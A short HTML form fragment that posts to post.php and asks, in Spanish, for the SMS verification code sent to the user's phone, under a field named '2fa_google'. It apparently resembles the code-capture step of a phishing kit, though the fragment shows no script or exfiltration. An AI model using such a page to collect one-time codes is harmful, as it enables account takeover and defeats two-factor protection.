...
<form method="POST" action="post.php">
	...
	<input id="user" type="text" name="2fa_google" placeholder="Ingrese el codigo SMS enviado a su celular"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
